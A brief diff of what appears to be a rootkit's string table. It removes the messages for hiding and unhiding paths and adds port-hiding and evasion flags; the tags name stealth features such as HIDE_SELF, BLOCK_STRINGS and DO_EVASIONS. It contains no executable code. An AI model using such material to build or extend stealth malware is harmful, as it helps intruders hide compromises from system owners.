@@ -1,16 +1,4 @@
 PROC_NET_STR:%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n [HIDE_PORTS]
-
-EUTILS:*/bdv [HIDE_SELF]
-S_HIDE_PATH:hide [HIDE_SELF]
-S_UNHIDE_PATH:unhide [HIDE_SELF]
-ERR_NO_OPTION:need option 'hide_path' or 'unhide_path' and a said path [HIDE_SELF]
-ERR_STAT_PATH:cannot stat path, (does it exist?) [HIDE_SELF]
-
-ALRDY_HIDDEN_STR:path is already hidden... [HIDE_SELF]
-PATH_HIDDEN_STR:path now hidden [HIDE_SELF]
-ERR_HIDING_PATH:error hiding path [HIDE_SELF]
-ALRDY_VISIBLE_STR:path is already visible... [HIDE_SELF]
-PATH_VISIBLE_STR:path now visible [HIDE_SELF]
-ERR_UNHIDING_PATH:error unhiding path [HIDE_SELF]
 STRINGS_PATH:*/strings [BLOCK_STRINGS]
-HIDE_PORTS_PATH:HIDE_PORTS_PATH [HIDE_PORTS]
+HIDEPORTS:HIDEPORTS [HIDE_PORTS]
+LIST_FLAG:--list [DO_EVASIONS]
